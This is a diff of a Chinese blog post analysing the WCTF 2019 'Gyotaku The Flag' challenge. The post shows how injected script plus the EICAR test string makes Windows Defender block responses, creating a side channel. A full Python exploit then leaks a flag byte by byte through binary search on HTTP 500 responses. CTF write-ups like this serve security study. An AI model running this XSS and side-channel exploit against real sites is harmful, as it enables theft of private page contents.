@@ -1,8 +1,189 @@
-<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><title>利用Windows Defender侧信道攻击[WCTF Gyotaku The Flag] [ 梅子酒の笔记本 ]</title><link rel="stylesheet" href="/css/meizj.css"><link rel="stylesheet" href="/css/prettify.css"><link rel="stylesheet" href="/css/tomorrow-night-blue.css"><link rel="stylesheet" href="/css/screen.css"><link rel="stylesheet" href="/css/tag.css"><script src="https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js"></script><script src="https://cdn.bootcss.com/lazysizes/5.1.0/lazysizes.min.js"></script><script>$("img").attr({"class":"lazyload"});
+<!DOCTYPE html>
+
+
+  <html class="dark page-post">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <title>利用Windows Defender侧信道攻击[WCTF Gyotaku The Flag] | 梅子酒の笔记本</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="forsigner,前端,设计,Hexo主题,前端开发,用户体验,设计,frontend,design,nodejs,JavaScript">
+  
+
+  <meta name="description" content="前言 在WCTF 2019上，TokyoWesterns设计了一道题目，在这道题目中，需要利用Windows Defender完成侧信道攻击，本篇主要是对该利用方式进行分析。 该题目的赛后分享文档见链接：https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf  Chrome Xss Auditor 该题目与35C3 CTF上的Fil">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用Windows Defender侧信道攻击[WCTF Gyotaku The Flag]">
+<meta property="og:url" content="https://meizjm3i.github.io/2019/08/01/利用Windows Defender侧信道攻击/index.html">
+<meta property="og:site_name" content="梅子酒の笔记本">
+<meta property="og:description" content="前言 在WCTF 2019上，TokyoWesterns设计了一道题目，在这道题目中，需要利用Windows Defender完成侧信道攻击，本篇主要是对该利用方式进行分析。 该题目的赛后分享文档见链接：https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf  Chrome Xss Auditor 该题目与35C3 CTF上的Fil">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-08-04T12:54:42.424Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="利用Windows Defender侧信道攻击[WCTF Gyotaku The Flag]">
+<meta name="twitter:description" content="前言 在WCTF 2019上，TokyoWesterns设计了一道题目，在这道题目中，需要利用Windows Defender完成侧信道攻击，本篇主要是对该利用方式进行分析。 该题目的赛后分享文档见链接：https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf  Chrome Xss Auditor 该题目与35C3 CTF上的Fil">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbeddx" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-38189205-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
 
 
 
-</script></head><body><div id="menu-outer"><nav id="menu-inner"><a id="menuLabel" href="/">Home</a><a id="menuLabel" href="/about">About</a><a id="menuLabel" href="/archives">Archives</a><a id="menuLabel" href="https://github.com/meizjm3i">Github</a></nav></div><div id="content-outer"><div id="content-inner"><div id="recent-posts"><a id="blogTitle">Meizj's Blog</a></div><article id="post"><h1 id="postTitle">利用Windows Defender侧信道攻击[WCTF Gyotaku The Flag]</h1><h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1>
+  
+
+</head>
+</html>
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">导航</span>
+  
+
+  <div class="post-header LEFT">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">导航</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/atom.xml"
+            rel="noopener noreferrer"
+            target="_blank"
+            >
+            RSS
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+
+
+<div class="content content-post LEFT">
+   <article id="post-利用Windows Defender侧信道攻击" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">利用Windows Defender侧信道攻击[WCTF Gyotaku The Flag]</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2019.08.01</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>Meizj</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/技术/">技术</a>
+  </span>
+
+
+
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1>
 <p>在WCTF 2019上，TokyoWesterns设计了一道题目，在这道题目中，需要利用Windows Defender完成侧信道攻击，本篇主要是对该利用方式进行分析。</p>
 <p>该题目的赛后分享文档见链接：<a href="https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf" target="_blank" rel="noopener">https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf</a></p>
 <h1 id="chrome-xss-auditor"><a class="markdownIt-Anchor" href="#chrome-xss-auditor"></a> Chrome Xss Auditor</h1>
@@ -39,8 +220,129 @@
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">l = <span class="number">0</span>;</span><br><span class="line">h = <span class="number">0x100</span>;</span><br><span class="line"><span class="keyword">while</span> h - l &gt; <span class="number">1</span>:</span><br><span class="line">    m = ( h + l ) <span class="comment">// 2;</span></span><br><span class="line">    <span class="keyword">if</span>(触发):</span><br><span class="line">        l = m</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        h = m</span><br></pre></td></tr></table></figure>
 <p>接下来需要思考的就是触发条件是什么了。由于在Windows Defener识别到恶意数据时，会返回500禁止访问，我们可以将500的状态作为if的判断条件。</p>
 <p>最终的exp为：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">"http://192.168.122.78"</span> <span class="comment"># changeme</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randstr</span><span class="params">(n=<span class="number">8</span>)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    <span class="keyword">import</span> string</span><br><span class="line">    chars = string.ascii_uppercase + string.ascii_lowercase + string.digits</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([random.choice(chars) <span class="keyword">for</span> _ <span class="keyword">in</span> range(n)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger</span><span class="params">(c, idx, sess)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> string</span><br><span class="line">    prefix = randstr()</span><br><span class="line">    p = prefix + <span class="string">'''&lt;script&gt;f=function(n)&#123;eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7&#125;$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+&#123;$&#123;c&#125;:'*'&#125;[Math.min($&#123;c&#125;,n)])&#125;;f(document.body.innerHTML[$&#123;idx&#125;].charCodeAt(0));&lt;/script&gt;&lt;body&gt;'''</span></span><br><span class="line">    p = string.Template(p).substitute(&#123;<span class="string">'idx'</span>: idx, <span class="string">'c'</span>: c&#125;)</span><br><span class="line">    req = sess.post(URL + <span class="string">'/gyotaku'</span>, data=&#123;<span class="string">'url'</span>: <span class="string">'http://127.0.0.1/flag?a='</span> + p&#125;)</span><br><span class="line">    <span class="keyword">return</span> req.json()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(idx, sess)</span>:</span></span><br><span class="line">    l, h = <span class="number">0</span>, <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">while</span> h - l &gt; <span class="number">1</span>:</span><br><span class="line">        m = (h + l) // <span class="number">2</span></span><br><span class="line">        gid = trigger(m, idx, sess)</span><br><span class="line">        <span class="keyword">if</span> sess.get(URL + <span class="string">'/gyotaku/'</span> + gid).status_code == <span class="number">500</span>:</span><br><span class="line">            l = m</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            h = m</span><br><span class="line">    <span class="keyword">return</span> chr(l)</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line">sess.post(URL + <span class="string">'/login'</span>, data=&#123;<span class="string">'username'</span>: <span class="string">'&lt;/body&gt;'</span>+randstr(), <span class="string">'password'</span>: randstr()&#125;)</span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    data += leak(i, sess)</span><br><span class="line">    print(data)</span><br></pre></td></tr></table></figure></article><div id="paginator"></div><div id="toc"></div></div></div><div id="footer"><div id="bottom-inner"><span>Powerd By </span><span> Meizj </span><span>using    </span><a href="https://github.com/meizjm3i/Meizj"><span>Meizj</span></a><span>.</span><br></div></div><script src="/js/prettify.js"></script><script src="/js/meizj.js"></script><script>//- $(window).on('load', function(){ 
-$('pre').addClass('prettyprint linenums');
-prettyPrint();
-//- });
-$(".gutter").remove();</script></body></html>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">"http://192.168.122.78"</span> <span class="comment"># changeme</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randstr</span><span class="params">(n=<span class="number">8</span>)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    <span class="keyword">import</span> string</span><br><span class="line">    chars = string.ascii_uppercase + string.ascii_lowercase + string.digits</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([random.choice(chars) <span class="keyword">for</span> _ <span class="keyword">in</span> range(n)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger</span><span class="params">(c, idx, sess)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> string</span><br><span class="line">    prefix = randstr()</span><br><span class="line">    p = prefix + <span class="string">'''&lt;script&gt;f=function(n)&#123;eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7&#125;$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+&#123;$&#123;c&#125;:'*'&#125;[Math.min($&#123;c&#125;,n)])&#125;;f(document.body.innerHTML[$&#123;idx&#125;].charCodeAt(0));&lt;/script&gt;&lt;body&gt;'''</span></span><br><span class="line">    p = string.Template(p).substitute(&#123;<span class="string">'idx'</span>: idx, <span class="string">'c'</span>: c&#125;)</span><br><span class="line">    req = sess.post(URL + <span class="string">'/gyotaku'</span>, data=&#123;<span class="string">'url'</span>: <span class="string">'http://127.0.0.1/flag?a='</span> + p&#125;)</span><br><span class="line">    <span class="keyword">return</span> req.json()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(idx, sess)</span>:</span></span><br><span class="line">    l, h = <span class="number">0</span>, <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">while</span> h - l &gt; <span class="number">1</span>:</span><br><span class="line">        m = (h + l) // <span class="number">2</span></span><br><span class="line">        gid = trigger(m, idx, sess)</span><br><span class="line">        <span class="keyword">if</span> sess.get(URL + <span class="string">'/gyotaku/'</span> + gid).status_code == <span class="number">500</span>:</span><br><span class="line">            l = m</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            h = m</span><br><span class="line">    <span class="keyword">return</span> chr(l)</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line">sess.post(URL + <span class="string">'/login'</span>, data=&#123;<span class="string">'username'</span>: <span class="string">'&lt;/body&gt;'</span>+randstr(), <span class="string">'password'</span>: randstr()&#125;)</span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    data += leak(i, sess)</span><br><span class="line">    print(data)</span><br></pre></td></tr></table></figure>
+    
+  </div>
+
+</article>
+
+
+   
+
+   
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/atom.xml"
+              rel="noopener noreferrer"
+              target="_blank"
+              >
+              RSS
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
